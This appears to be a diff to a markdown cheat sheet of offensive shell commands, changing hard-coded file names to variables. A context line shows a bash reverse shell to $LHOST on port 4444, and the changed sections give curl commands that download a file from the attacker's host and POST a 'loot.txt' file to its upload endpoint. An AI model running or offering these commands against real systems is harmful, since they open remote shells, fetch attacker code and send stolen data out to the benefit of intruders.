@@ -58,12 +58,14 @@ bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'
 
 ## Primary file download
 ```bash
-curl -o "$wd/file" "http://$LHOST/file"
+file="file.sh"
+curl -o "$wd/$file" "http://$LHOST/$file"
 ```
 
 ## Primary file upload
 ```bash
-curl -X POST --data-binary @"$wd/loot.txt" "http://$LHOST/upload?name=loot.txt"
+file="loot.txt"
+curl -X POST --data-binary @"$wd/$file" "http://$LHOST/upload?name=$file"
 ```
 
 ## Fallback file download
